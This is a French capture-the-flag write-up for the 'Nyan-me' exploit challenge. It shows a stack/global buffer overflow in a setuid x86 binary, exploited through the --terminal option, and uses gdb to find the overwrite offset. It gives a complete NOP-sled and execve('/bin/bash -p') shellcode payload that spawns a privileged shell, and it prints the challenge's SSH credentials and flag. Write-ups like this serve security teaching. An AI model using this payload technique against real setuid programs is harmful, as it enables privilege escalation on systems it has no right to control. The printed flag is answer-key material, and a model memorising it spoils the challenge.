# Write up : Nyan-me

Catégorie :

```
Exploit
```

Consigne : 

```
Accédez au home de l'utilisateur : super-nyan-me.<p>

Accès au challenge :<br>
<FONT COLOR="#ff0000">ssh -p 31002 nyan-me@game2.marshack.fr</FONT><br>
password : <FONT COLOR="#ff0000">nyan-me</FONT>
```

Pièce jointe :

```
Aucune
```

Serveur :

```
game2
```

Points attribués : 

```
100 points
```

Flag : 

```
MARS{5h3llc0d3 32 b1t5!}
```

ASLR :

```
L'ASLR doit être désactivée  => game2.marshack.fr
```



## Principe

Cette épreuve consiste à exploiter un tampon alloué dans la pile (ou _stack_ en anglais) de l'espace mémoire du processus hôte.

Le travail nécéssaire pour réussir cette épreuve se décline en trois phases :

- Compréhension du code source ;
- Compréhension de la vulnérabilité ;
- Exploitation de la vulnérabilité.

Le présent document constitue _une_ des solutions possibles pour cette épreuve.

## Correction

### Architecture du processeur

Avant de passer à l'exploitation de ce binaire, il est utile de s'intéresser à l'architecture du processeur de la machine, car les étapes suivantes dépendront grandement de cette dernière (notamment au niveau des jeux d'instructions disponibles) :

```sh
arch
x86_64

uname -s
Linux
```

Il est donc ici question d'un système d'exploitation de type GNU/Linux (ou à minima d'un _kernel_ Linux) opérant sur une machine dotée d'un processeur appartenant à la famille Intel x86 (i386, i486, i686, etc.).

### Crash test

Après avoir lancé le programme à plusieurs reprises, on se rend compte que celui-ci peut prendre différentes options :

```sh
./nyan-me ---
./nyan-me: unrecognized option '---'
usage: ./nyan-me [--help] [--duration SECONDS] [--terminal TERMINAL]
```

```
$ ./nyan-me -h
usage: ./nyan-me [--help] [--duration SECONDS] [--terminal TERMINAL]

optional arguments:
  -d, --duration  set the duration in seconds (1=poser, 3735927486=warrior)
  -h, --help      show this help message and exit
  -r, --rythm     set the nyan rythm (1=infusion, 2=water, 3=coffee)
  -t, --terminal  manually specify the terminal emulator
```



Les options possibles étant `duration` (entier), `help` (booléen), `rythm` (entier) et `terminal` (chaîne de caractères).

```sh
./nyan-me --duration abc
usage: ./nyan-me [--help] [--duration SECONDS] [--terminal TERMINAL]
./nyan-me --duration `python -c "print('Z' * 200)"`
usage: ./nyan-me [--help] [--duration SECONDS] [--terminal TERMINAL]
./nyan-me --duration `python -c "print('2' * 200)"`
usage: ./nyan-me [--help] [--duration SECONDS] [--terminal TERMINAL]
./nyan-me --duration 99999999999999999999999999999999
usage: ./nyan-me [--help] [--duration SECONDS] [--terminal TERMINAL]

./nyan-me --rythm abc
usage: ./nyan-me [--help] [--duration SECONDS] [--terminal TERMINAL]
./nyan-me --rythm `python -c "print('Z' * 200)"`
usage: ./nyan-me [--help] [--duration SECONDS] [--terminal TERMINAL]
./nyan-me --rythm `python -c "print('2' * 200)"`
usage: ./nyan-me [--help] [--duration SECONDS] [--terminal TERMINAL]
./nyan-me --rythm 99999999999999999999999999999999
usage: ./nyan-me [--help] [--duration SECONDS] [--terminal TERMINAL]
```

Après quelques tentatives, force est de constater qu'il sera compliqué — voire impossible — d'exploiter les valeurs passées par les options `duration`, `help` et `rythm`.

L'option `terminal`, quant à elle, permet de fournir une chaîne de caractères arbitraire au programme. En se référant au code source (et plus précisement au fichier `nyan-me.c` contenant les mécaniques internes), il est possible d'observer la fonction suivante :

```c
static int id_term(char *terminal)
{
    if (strstr(terminal, "xterm"))
        return 1; /* 256-color, spaces */

    else if (strstr(terminal, "toaru"))
        return 1; /* Emulates xterm */

    else if (strstr(terminal, "linux"))
        return 3; /* Spaces and blink attribute */

    else if (strstr(terminal, "vtnt"))
        return 5; /* Extended ASCII fallback == Windows */

    else if (strstr(terminal, "cygwin"))
        return 5; /* Extended ASCII fallback == Windows */

    else if (strstr(terminal, "vt220"))
        return 6; /* No color support */

    else if (strstr(terminal, "fallback"))
        return 4; /* Unicode fallback */

    else if (strstr(terminal, "rxvt-256color"))
        return 1; /* xterm 256-color compatible */

    else if (strstr(terminal, "rxvt"))
        return 3; /* Accepts LINUX mode */

    else if (!strncmp(terminal, "st", 2))
        return 1; /* Simple terminal xterm-256color-compatible */

    return 2; /* Everything else */
}
```

En essayant quelques chaînes de caractères testées par cette fonction (`xterm`, `vt220`, etc.), il est possible de conclure que le contenu de l'option `terminal` est utilisé par le programme pour identifier l'émulateur de terminal courant.

Bénéficiant de cette information, il est intéressant d'essayer de passer en valeur de l'option `terminal` une chaîne de caractères relativement longue afin d'étudier les mécanismes de filtrage du programme :

```sh
./nyan-me -t `python -c "print('Z' * 3000)"`
Segmentation fault (core dumped)
```

Dans le cas présent, le programme ne filtre pas correctement cette information, ce dernier terminant de manière abrupte avec une erreur de segmentation (_segmentation fault_).

Effectivement, en observant le code source, il est possible de remonter jusqu'à la structure contenant l'adresse de la chaîne de caractère `terminal` utilisée pour stocker le contenu de cette option :

```c
#define DEF_BUFFER_SZ 256

typedef struct S_OPTS
{
    double duration;
    short rythm;
    char terminal[DEF_BUFFER_SZ]; 
    void (*newline)(int);
    void (*cleanup)(void);
} S_OPTS;
```

Celle-ci est initialisée de manière globale quelques lignes après sa déclaration :

```c
#define DEF_DURATION 0xDEADBABE
#define DEF_TERM_EMULATOR "ansi"

static S_OPTS opts = {
    .duration = DEF_DURATION, 
    .rythm = 2, 
    .terminal = DEF_TERM_EMULATOR,
    .newline = &newline,
    .cleanup = &cleanup
};
```

La structure `opts` déclare également deux pointeurs de fonctions `newline` et `cleanup` pointant vers les adresses des fonctions homonymes `newline` et `cleanup` (également définies dans le fichier `nyan-me.c`).

### Redirection du flot de contrôle

Par le biais du débogueur `gdb` (_GNU Debugger_), il est ensuite possible d'évaluer l'exploitabilité de ce binaire.

Afin de prévenir l'éventuel décalage des adresses mémoire provoqué par les variations d'environnements et/ou le débogueur, éxecuter les commandes suivantes :

```sh
gdb -q ./nyan-me
(gdb) unset env LINES
(gdb) unset env COLUMNS
```

De cette manière, les variables d'environnement `LINES` et `COLUMNS` initialisées par `gdb` sont supprimées. Exécutée dans le contexte de `gdb`, la commande `show env` permet ensuite de vérifier l'état de l'environnement courant.

La prochaine étape consiste à déterminer s'il est possible de rediriger le flot d'exécution (ou flot de contrôle) du programme au travers de l'option `terminal` :

```sh
(gdb) r -t `python -c "print('Z' * 300)"`
Starting program: nyan-me -t `python -c "print('Z' * 300)"`

Program received signal SIGSEGV, Segmentation fault.
0x7a7a7a7a in ?? ()
```

Le flot d'exécution pointe maintenant vers l'adresse inexistante `0x7a7a7a7a`, ce qui provoque un arrêt du programme. Il est donc possible d'altérer la valeur du registre EIP (_Instruction Pointer_) par le biais de l'option `terminal` afin de détourner le flot d'exécution du programme.

En effet, le code source montre que les fonctions `newline` et `cleanup` sont appellées à plusieurs reprises au cours de l'exécution du programme. Il est donc possible de rediriger le flot d'exécution du programme à l'appel d'une de ces fonctions en écrasant l'adresse correspondante dans la structure `opts` par une adresse éronnée et/ou maitrisée.

### Calcul du décalage

Afin de maitrîser la valeur écrite sur le pointeur `newline` lors du dépassement du tampon `terminal`, il est nécéssaire de calculer le nombre exact de caractères nécéssaires afin de remplir complètement ce dernier :

```sh
(gdb) r -t `python -c "print('Z' * 262)"`
Starting program: nyan-me -t `python -c "print('Z' * 262)"`

Program received signal SIGSEGV, Segmentation fault.
0x7a7a7a7a in ?? ()
```

Dans le cas présent, injecter une chaîne de 262 caractères permet d'écraser complètement le tampon `terminal` ainsi que la valeur de `newline`. La taille d'un pointeur étant de 4 octets sur les processeurs 32 bits, il faut donc soustraire 4 octets au nombre d'octets nécéssaires afin d'écraser complètement le registre EIP.

Dans le cas présent, cette valeur est donc 258.

> Il est important de mentionner que ce décalage peut varier selon l'environnement d'exécution du programme.

Une fois cette valeur connue, il est alors possible d'écraser l'adresse de la fonction `newline` (stockée dans la structure `opts`) par une adresse contrôlée.

À ce stade, le code permettant d'exploiter la vulnérabilité dans le but de rediriger le flot d'exécution du programe se présente sous la forme suivante : `258 * padding + address`.

### Adresse du tampon en mémoire

Avant de pouvoir faire pointer le programme sur l'adresse d'un code maitrisé, il est nécéssaire de connaître l'adresse du tampon `terminal` en mémoire.

Cette adresse est récupérable de plusieurs manières, notamment la suivante :

```sh
(gdb) r -t `python -c "print('Z' * 262)"`
Starting program: nyan-me -t `python -c "print('Z' * 262)"`

Program received signal SIGSEGV, Segmentation fault.
0x7a7a7a7a in ?? ()
(gdb) x/200x $ebp
0xbffffcc8:	0xbffffcf8	0x08049a82	0x00000003	0xbffffda4
0xbffffcd8:	0xb7e45880	0x08049a5f	0x00000003	0xbffffda4
0xbffffce8:	0xbffffdb4	0xbffffd10	0x00000000	0x00000003
0xbffffcf8:	0x00000000	0xb7e2f286	0x00000003	0xb7fca000
0xbffffd08:	0x00000000	0xb7e2f286	0x00000003	0xbffffda4
0xbffffd18:	0xbffffdb4	0x00000000	0x00000000	0x00000000
0xbffffd28:	0xb7fca000	0xb7fffc0c	0xb7fff000	0x00000000
0xbffffd38:	0x00000003	0xb7fca000	0x00000000	0x91472aef
0xbffffd48:	0xab5986ff	0x00000000	0x00000000	0x00000000
0xbffffd58:	0x00000003	0x080487b0	0x00000000	0xb7ff0710
0xbffffd68:	0xb7e2f199	0xb7fff000	0x00000003	0x080487b0
0xbffffd78:	0x00000000	0x080487d1	0x08049a47	0x00000003
0xbffffd88:	0xbffffda4	0x08049aa0	0x08049b00	0xb7feb070
0xbffffd98:	0xbffffd9c	0xb7fff920	0x00000003	0xbffffe8a
0xbffffda8:	0xbffffeae	0xbffffeb1	0x00000000	0xbfffffba
0xbffffdb8:	0x00000000	0x00000020	0xb7fd9cd0	0x00000021
0xbffffdc8:	0xb7fd9000	0x00000010	0x078bfbbf	0x00000006
0xbffffdd8:	0x00001000	0x00000011	0x00000064	0x00000003
0xbffffde8:	0x08048034	0x00000004	0x00000020	0x00000005
0xbffffdf8:	0x00000009	0x00000007	0xb7fdb000	0x00000008
0xbffffe08:	0x00000000	0x00000009	0x080487b0	0x0000000b
0xbffffe18:	0x000003e8	0x0000000c	0x000003e8	0x0000000d
0xbffffe28:	0x000003e8	0x0000000e	0x000003e8	0x00000017
0xbffffe38:	0x00000000	0x00000019	0xbffffe6b	0x0000001f
0xbffffe48:	0xbfffffd8	0x0000000f	0xbffffe7b	0x00000000
0xbffffe58:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffe68:	0xd4000000	0x85433ded	0x89c8375e	0x9d198054
0xbffffe78:	0x69faf928	0x00363836	0x00000000	0x00000000
0xbffffe88:	0x682f0000	0x2f656d6f	0x6c346b73	0x796e2f61
0xbffffe98:	0x742d6e61	0x2f677568	0x2f6e6962	0x6e61796e
0xbffffea8:	0x7568742d	0x742d0067	0x5a5a5a00	0x5a5a5a5a
0xbffffeb8:	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a
0xbffffec8:	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a
0xbffffed8:	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a
0xbffffee8:	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a
0xbffffef8:	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a
0xbfffff08:	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a
0xbfffff18:	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a
0xbfffff28:	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a
0xbfffff38:	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a
0xbfffff48:	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a
0xbfffff58:	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a
0xbfffff68:	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a
0xbfffff78:	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a
0xbfffff88:	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a
0xbfffff98:	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a
0xbfffffa8:	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a
0xbfffffb8:	0x5750005a	0x682f3d44	0x2f656d6f	0x6c346b73
0xbfffffc8:	0x796e2f61	0x742d6e61	0x2f677568	0x006e6962
0xbfffffd8:	0x6d6f682f	0x6b732f65	0x2f616c34	0x6e61796e
```

> Cette méthode permet d'afficher 200 octets de la pile en hexadécimal à partir de l'adresse contenue dans le registre EBP (_Base Pointer_).

### Génération du _shellcode_

Une fois le flot d'exécution du programme détourné, l'objectif consiste à injecter du code (plus précisement une suite d'instructions, ou _opcodes_) contrôlé dans la mémoire du programme. Le tampon `terminal` paraît être un choix judicieux, ce dernier étant maîtrisé par l'utilisateur et pouvant contenir jusqu'à 260 octets.

Le site ShellStorm (http://shell-storm.org/shellcode/) recense des dizaines de _shellcodes_ (suite d'_opcodes_) pour différentes architectures processeurs.

Dans le cas présent, la machine exploitée étant une machine GNU/Linux i686 (Intel x86), le _shellcode_ "Linux/x86 execve /bin/sh shellcode 23 bytes" (http://shell-storm.org/shellcode/files/shellcode-606.php) présente un bon exemple car il permet de créer un processus de type _shell_ interactif et ne compte que 33 octets, ce qui rentre dans le tampon (ce dernier pouvant contenir jusqu'à 260 octets).

```
Title: 	Linux x86 - execve("/bin/bash", ["/bin/bash", "-p"], NULL) - 33 bytes
Author:	Jonathan Salwan
Mail:	submit@shell-storm.org
Web:	http://www.shell-storm.org

!Database of Shellcodes http://www.shell-storm.org/shellcode/


sh sets (euid, egid) to (uid, gid) if -p not supplied and uid < 100
Read more: http://www.faqs.org/faqs/unix-faq/shell/bash/#ixzz0mzPmJC49

sassembly of section .text:

08048054 <.text>:
 8048054:	6a 0b                	push   $0xb
 8048056:	58                   	pop    %eax
 8048057:	99                   	cltd   
 8048058:	52                   	push   %edx
 8048059:	66 68 2d 70          	pushw  $0x702d
 804805d:	89 e1                	mov    %esp,%ecx
 804805f:	52                   	push   %edx
 8048060:	6a 68                	push   $0x68
 8048062:	68 2f 62 61 73       	push   $0x7361622f
 8048067:	68 2f 62 69 6e       	push   $0x6e69622f
 804806c:	89 e3                	mov    %esp,%ebx
 804806e:	52                   	push   %edx
 804806f:	51                   	push   %ecx
 8048070:	53                   	push   %ebx
 8048071:	89 e1                	mov    %esp,%ecx
 8048073:	cd 80                	int    $0x80

*/

#include <stdio.h>

char shellcode[] = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70"
		   "\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61"
		   "\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52"
		   "\x51\x53\x89\xe1\xcd\x80";

int main(int argc, char *argv[])
{
       	fprintf(stdout,"Length: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();       
}
```



> Il est également possible de créer son propre _shellcode_ en précompilant par exemple la fonction désirée sur le même type d'architecture processeur et en extrayant les _opcodes_.

### Structure du tampon

Sur les processeurs de type Intel x86, une instruction particulière permet de faire "glisser" le flot d'exécution du programme : l'_opcode_ `0x90`, ou NOP (pour _no operation_).

> Extrait de la documentation d'Intel :
>
> | CPU architecture     | Instruction Mnemonic | Bytes        | Opcode |
> | -------------------- | -------------------- | ------------ | ------ |
> | Intel x86 CPU family | NOP                  | 1–9 for i686 | 0x90   |

En partant de l'_offset_ récupéré précédemment (soit 258), le code permettant d'exploiter la vulnérabilité peut donc se décomposer comme tel : `200 * nop + shellcode(33) + (58 - len(shellcode)) * nop + addresse(4)`.

> La valeur 200 est arbitraire, l'objectif premier étant de faire tenir le _shellcode_ dans le tampon et de remplir le reste avec des instructions NOP (`0x90`).

### Exploitation

En modélisant ce code avec Python, on constate que le _shell_ intéractif est bien créé :

```sh
gdb -q nyan-me
Reading symbols from nyan-me...done.
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) r  -t `python -c "print(200 * '\x90' + '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80' + 25 *  '\x90' + '\xe8\xdd\xff\xff')"`

Résultat de la commande :
Starting program: /home/nyan-me/nyan-me -t `python -c "print(200 * '\x90' + '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80' + 25 *  '\x90' + '\xe8\xdd\xff\xff')"`
process 816 is executing new program: /bin/bash
```

Afin de pouvoir bénéficier du SUID (_Set User IDentifier_) en super-nyan-me, il est nécessaire de sortir du débogueur (d'où l'intérêt d'initialiser correctement l'environnement avant de commencer à déboguer). On lance ensuite le programme avec le code préparé précédemment :

```sh
nyan-me@3456bab20570:~$ /home/nyan-me/nyan-me  -t `python -c "print(200 * '\x90' + '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80' + 25 *  '\x90' + '\xe8\xdd\xff\xff')"`

bash-4.3$ id
uid=1000(nyan-me) gid=1000(nyan-me) euid=1001(super-nyan-me) groups=1000(nyan-me)

```

On constate que l'identifiant utilisateur correspond bien à celui de l'utilisateur `super-nyan-me`. Les privilèges de l'utilisateur courant ont donc été élevés.

Il ne reste plus qu'a lire le fichier dans /home/super-nyan-me/flag.txt

```
cat /home/super-nyan-me/flag.txt

MARS{5h3llc0d3 32 b1t5!}
```

Résultat : MARS{5h3llc0d3 32 b1t5!}

## Crédits

Cette épreuve est inspirée du programme original développé par Kevin Lange (http://github.com/klange/nyancat).